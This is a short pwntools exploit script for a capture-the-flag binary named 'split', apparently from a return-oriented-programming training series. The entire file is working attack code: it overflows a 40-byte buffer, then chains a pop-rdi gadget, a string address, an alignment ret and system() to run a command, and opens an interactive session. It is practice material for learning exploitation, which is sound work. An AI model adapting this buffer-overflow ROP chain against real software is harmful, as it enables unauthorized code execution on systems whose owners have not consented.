from pwn import *

io = process('./split')


# Gadget to pop rdi
gadget = p64(0x4007c3)

# Print flag
print_flag = p64(0x601060)

#system address
system = p64(0x400560)

# Send the payload
payload = b"A"*40 #fill the buffer until ret address
payload += gadget
payload += print_flag
payload += p64(0x40053e)
payload += system
io.sendline(payload)
io.interactive()